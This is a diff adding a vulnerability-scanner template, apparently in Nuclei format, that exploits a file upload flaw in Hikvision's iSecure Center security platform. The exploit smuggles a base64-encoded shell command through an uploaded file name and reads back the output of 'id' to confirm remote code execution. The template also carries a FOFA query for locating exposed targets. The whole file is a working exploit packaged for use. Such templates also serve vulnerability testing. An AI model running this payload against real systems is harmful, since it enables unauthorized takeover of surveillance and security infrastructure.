@@ -1,0 +1,49 @@
+id: hikvision-csmp-productfile-rce-2
+
+info:
+  name: hikvision-csmp-productfile-rce-2
+  author: leadlife
+  severity: critical
+  description: 海康威视-综合安防管理平台 /svm/api/v1/productFile 路径存在任意文件上传 rce
+  metadata:
+    max-request: 3
+    fofa-query: app="HIKVISION-iSecure-Center"
+  tags: rce, hikvision, file-upload
+
+http:
+  - raw:
+      - |
+        GET /iac/configService/v1/address HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /svm/api/v1/productFile?type=product&ip=127.0.0.1& HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypicdtung
+        {{token}}
+
+        ------WebKitFormBoundarypicdtung
+        Content-Disposition: form-data; name="file";filename=test";echo aWQgPiAuLi8uLi9vcHNNZ3JDZW50ZXIvZGF0YS9iaWNfZG93bmxvYWQvbmJrY2Rzc3guaHRtbA==|base64 -d|bash;.zip
+        Content-Type: application/zip
+
+        test
+        ------WebKitFormBoundarypicdtung--
+
+      - |
+        GET /download_bic/nbkcdssx.html HTTP/1.1
+        Host: {{Hostname}}
+        {{token}}
+
+    extractors:
+      - type: regex
+        name: token
+        internal: true
+        part: header_1
+        regex:
+          - 'Token:\s*([A-Za-z0-9=]+)'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 403 && status_code_2 == 200 && status_code_3 == 200"
+          - "contains(body_3,'uid=')"
